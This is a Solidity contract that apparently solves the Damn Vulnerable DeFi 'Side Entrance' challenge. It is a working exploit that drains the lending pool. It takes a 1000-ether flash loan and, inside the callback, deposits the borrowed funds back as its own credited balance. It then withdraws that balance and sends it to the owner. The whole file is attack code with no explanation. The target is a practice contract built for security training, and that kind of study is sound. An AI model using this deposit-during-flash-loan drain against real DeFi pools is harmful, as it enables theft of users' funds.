// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external ;
    function deposit() external payable;
}

/**
 * @title SideEntranceLenderPool_test
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool_test {

    IFlashLoanEtherReceiver private immutable pool;
    address IFlashLoanEtherReceiver_add;
    address private immutable owner;

    constructor(address poolAddress) {
        IFlashLoanEtherReceiver_add=poolAddress;
        pool = IFlashLoanEtherReceiver(poolAddress);
        owner = msg.sender;
    }
    function flashLoan() external payable{
        require(msg.sender==owner,"only owner can call");
        pool.flashLoan(1000 ether);

        pool.withdraw();
        payable(msg.sender).send(address(this).balance);  
    }

    function execute() external payable{
        require(msg.sender==IFlashLoanEtherReceiver_add,"only pool can call");
        pool.deposit{value: msg.value}();  
    }

   receive()external payable{}


}